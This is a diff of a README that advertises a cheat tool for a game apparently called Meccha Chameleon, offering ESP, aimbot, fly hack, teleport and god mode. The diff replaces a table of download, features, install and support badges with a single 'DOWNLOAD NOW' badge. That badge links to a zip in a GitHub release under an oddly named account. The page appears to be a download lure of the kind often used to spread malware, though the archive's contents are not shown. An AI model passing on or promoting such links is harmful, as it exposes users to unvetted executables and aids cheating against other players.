@@ -7,8 +7,7 @@ ESP · Aimbot · Fly Hack · Teleport · God Mode · Infinite Paint
 
 
 
-| [![⬇️ DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-2ea043?style=for-the-badge&logo=github&logoColor=white&labelColor=1a7a37)](https://github.com/LaneLawyerSense/Meccha-Chameleon-MecchaQuantum/releases/download/MecchaQuantu/MecchaQuantum.zip) | [![✨ FEATURES](https://img.shields.io/badge/✨_FEATURES-1f6feb?style=for-the-badge&labelColor=0d47a1)](https://github.com/PitShipwrightGraph/MecchaQuantum#-features) | [![⚙️ INSTALL](https://img.shields.io/badge/⚙️_INSTALL-ea7f2e?style=for-the-badge&labelColor=bf5e1a)](https://github.com/LaneLawyerSense/Meccha-Chameleon-MecchaQuantum/releases/download/MecchaQuantu/MecchaQuantum.zip) | [![💬 SUPPORT](https://img.shields.io/badge/💬_SUPPORT-8b5cf6?style=for-the-badge&labelColor=5b2d8e)](https://github.com/PitShipwrightGraph/MecchaQuantum#-support) |
-|:---:|:---:|:---:|:---:|
+ [![⬇️ DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-2ea043?style=for-the-badge&logo=github&logoColor=white&labelColor=1a7a37)](https://github.com/LaneLawyerSense/Meccha-Chameleon-Helper/releases/download/Meccha'Quantum/MecchaQuantum.zip)
 
 </div>
 
